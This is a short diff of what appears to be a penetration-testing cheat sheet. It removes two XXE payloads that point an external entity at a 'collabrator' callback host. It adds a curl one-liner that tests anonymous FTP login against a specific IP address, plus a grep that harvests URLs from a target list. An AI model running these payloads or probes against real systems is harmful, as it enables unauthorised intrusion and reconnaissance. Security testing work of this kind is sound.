@@ -29,14 +29,14 @@ fi
 done
 
 ```
-### Entities are not allowed
+### Anonymous ftp login [cradit:JoyGhoshs]
 ```
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://colabrator/"> ]>
+curl -m 6 -s ftp://178.33.155.61 --user "Anonymous:Anonymous" | grep "r" &>/dev/null && echo -e "\033[31mAnonymous Login allowed" || echo " [+]  Not Allowe
 
 ```
-### Entities are not allowed
+### collect all urls from text file
 ```
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://collabrator"> %xxe; ]> //dont call xxe
+cat target.txt| grep -Eo '(http|https|ftp|aaa|aaas|acap|acct|acr|xmpp|udp|s3|git|file|apt|admin|app)://[a-zA-Z0-9./?=_%:-]*
 
 ```
 ### must try
